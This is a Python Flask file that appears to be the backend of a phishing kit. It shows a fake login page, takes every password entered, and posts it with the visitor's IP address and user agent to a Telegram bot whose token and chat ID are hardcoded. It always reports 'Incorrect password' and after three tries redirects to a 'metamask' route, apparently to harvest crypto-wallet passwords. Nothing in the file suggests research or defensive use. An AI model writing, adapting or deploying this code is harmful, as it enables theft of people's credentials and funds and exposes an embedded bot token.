from flask import Flask, render_template, request, redirect, url_for, flash, session, jsonify
import requests
from functools import wraps
import os

app = Flask(__name__)
# Use environment variable for secret key in production
app.secret_key = os.environ.get('SECRET_KEY', 'your-dev-secret-key')

# Telegram settings
TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN', '7852920019:AAFfrg0doyB8YnLg660dunZ6PYvn5sxBHfs')
TELEGRAM_CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID', '-4674560339')

def send_to_telegram(message):
    try:
        telegram_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {
            "chat_id": TELEGRAM_CHAT_ID,
            "text": message,
            "parse_mode": "HTML"
        }
        response = requests.post(telegram_url, data=payload)
        return response.json()
    except Exception as e:
        print(f"Error sending to Telegram: {e}")
        return None

def init_session():
    if 'attempts' not in session:
        session['attempts'] = 0

@app.route('/')
def home():
    init_session()
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def login():
    init_session()
    password = request.form.get('password')
    
    # Get IP and user agent
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent')
    
    # Increment attempt counter
    session['attempts'] = session.get('attempts', 0) + 1
    
    # Format message for Telegram
    message = (
        f"🔐 New Password Attempt #{session['attempts']}\n\n"
        f"📌 Password: <code>{password}</code>\n"
        f"🌐 IP: <code>{ip}</code>\n"
        f"📱 User-Agent: <code>{user_agent}</code>"
    )
    
    # Send to Telegram
    send_to_telegram(message)
    
    # Check attempts
    if session['attempts'] >= 3:
        # Reset attempts and return special response
        session['attempts'] = 0
        return jsonify({'status': 'error', 'redirect': 'metamask'})
    
    # Return JSON response for error
    return jsonify({
        'status': 'error',
        'message': 'Incorrect password'
    })

@app.route('/dashboard')
def dashboard():
    # Add your dashboard logic here
    return "failed to load dashboard"


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000))) 